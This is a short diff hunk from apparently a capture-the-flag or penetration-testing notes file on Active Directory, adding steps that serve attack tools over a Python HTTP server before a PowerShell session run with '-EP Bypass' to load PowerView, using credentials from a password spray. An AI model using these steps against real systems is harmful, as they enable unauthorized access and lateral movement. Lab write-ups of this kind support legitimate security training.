@@ -1029,7 +1029,9 @@ found here mark is pewned
 
 * Powerview
 ```console
-~$:open Remmina with credential opt from password spray technique 
+~$: cd /root/ADtools
+ python3 -m http.server in the terminal and press Enter to start the HTTP server.
+open Remmina with credential opt from password spray technique 
 open powershell
 cd Downloads 
 Powershell -EP Bypass
